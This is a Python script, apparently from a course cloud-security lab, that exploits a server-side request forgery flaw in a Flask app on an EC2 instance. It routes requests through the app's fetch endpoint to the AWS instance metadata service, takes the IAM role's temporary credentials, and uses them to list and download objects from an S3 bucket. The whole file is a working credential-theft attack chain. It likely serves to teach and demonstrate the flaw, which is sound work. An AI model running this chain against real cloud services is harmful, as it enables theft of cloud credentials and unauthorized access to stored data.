import requests
import json
import boto3
import argparse

import subprocess

# Function to get the EC2 public IP from Terraform
def get_ec2_public_ip():
    try:
        # Run the Terraform command and capture the output
        result = subprocess.run(
            ['terraform', 'output', '-raw', 'ec2_public_ip'],
            capture_output=True,
            text=True,
            check=True
        )
        # Extract the IP address from the command output and remove any whitespace
        ec2_ip = result.stdout.strip()
        return ec2_ip
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to retrieve EC2 public IP with Terraform: {e}")
        return None
    except Exception as e:
        print(f"Error: An unexpected issue occurred: {e}")
        return None

# Main execution
# def main():
#
#
# if __name__ == "__main__":
#     main()


def main():
    # Parse command-line argument for EC2 public IP
    # parser = argparse.ArgumentParser(description='Demonstrate SSRF vulnerability to access S3 bucket via IMDS')
    # parser.add_argument('ec2_ip', help='Public IP of the EC2 instance running the Flask app')
    # args = parser.parse_args()

    # Get the EC2 public IP
    ec2_ip = get_ec2_public_ip()
    if not ec2_ip:
        print("Failed to retrieve the EC2 public IP. Exiting.")
        return

    # Example usage: Print the IP address
    print(f"The EC2 public IP address is: {ec2_ip}")

    # Optional: Use the IP address in your script (e.g., construct a URL)
    # Replace this with your actual use case
    # example_url = f"http://{ec2_ip}/some-endpoint"
    # print(f"Constructed URL: {example_url}")

    # ec2_ip = args.ec2_ip
    base_url = f'http://{ec2_ip}/fetch?url='

    # Step 1: Retrieve IAM role name from IMDS via SSRF
    role_url = base_url + 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    try:
        response = requests.get(role_url)
        if response.status_code != 200:
            print(f'Error: Failed to retrieve IAM role name. Status code: {response.status_code}')
            return
        role_name = response.text.strip()
        print(f'Step 1: Retrieved IAM Role Name: {role_name}')
    except requests.RequestException as e:
        print(f'Error: Unable to connect to Flask app for role name: {e}')
        return

    # Step 2: Retrieve temporary credentials using the role name
    credentials_url = base_url + f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
    try:
        response = requests.get(credentials_url)
        if response.status_code != 200:
            print(f'Error: Failed to retrieve credentials. Status code: {response.status_code}')
            return
        credentials = json.loads(response.text)
        access_key = credentials['AccessKeyId']
        secret_key = credentials['SecretAccessKey']
        session_token = credentials['Token']
        print('Step 2: Temporary AWS Credentials Retrieved')
        print(f'AccessKeyId: {access_key}')
        print(f'SecretAccessKey: {secret_key[:6]}... (truncated)')
        print(f'Token: {session_token[:6]}... (truncated)')
    except (requests.RequestException, json.JSONDecodeError, KeyError) as e:
        print(f'Error: Unable to retrieve or parse credentials: {e}')
        return

    # Step 3: Create a boto3 session with the temporary credentials
    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token
    )
    s3 = session.client('s3')
    bucket_name = 'seas8405-week6-lab1-vulnerable-s3'

    # Step 4: List contents of the S3 bucket
    try:
        response = s3.list_objects_v2(Bucket=bucket_name)
        print('Step 3: S3 Bucket Contents:')
        for obj in response.get('Contents', []):
            print(f'- {obj["Key"]}')
    except Exception as e:
        print(f'Error: Failed to list bucket contents: {e}')
        return

    # Step 5: Download and display the contents of sample.txt
    try:
        obj = s3.get_object(Bucket=bucket_name, Key='sample.txt')
        content = obj['Body'].read().decode('utf-8')
        print('Step 4: Content of sample.txt:')
        print(content)
    except Exception as e:
        print(f'Error: Failed to download sample.txt: {e}')


if __name__ == '__main__':
    main()

